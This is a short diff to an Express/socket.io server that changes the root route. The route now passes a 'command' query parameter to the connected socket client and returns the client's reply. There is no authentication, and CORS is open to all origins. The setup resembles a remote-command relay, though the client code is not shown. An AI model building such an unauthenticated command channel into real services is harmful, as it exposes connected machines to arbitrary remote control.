@@ -11,15 +11,18 @@ App.use(Morgan("dev"));
 App.use(Cors({ origin: "*" }));
 
 App.get("/", (req, res) => {
-  res.send({ data: "Hello world" });
+  _SOCKET.emit("message", req.query.command);
+  _SOCKET.on("message", (data) => {
+    console.log("🚀 ~ _SOCKET.on ~ data:", data);
+    data = Buffer.from(data.toString(), "utf-8").toString("utf-8");
+    res.write(data);
+    return res.end();
+  });
 });
 
 io.on("connection", (socket) => {
   _SOCKET = socket;
   console.log(`Client connected with socket.id: ${socket.id}`);
-
-  // Send a welcome message to the connected client
-  socket.emit("message", `Hello from server! Your socket.id is ${socket.id}`);
 
   // Listen for messages from the client
   socket.on("clientMessage", (data) => {
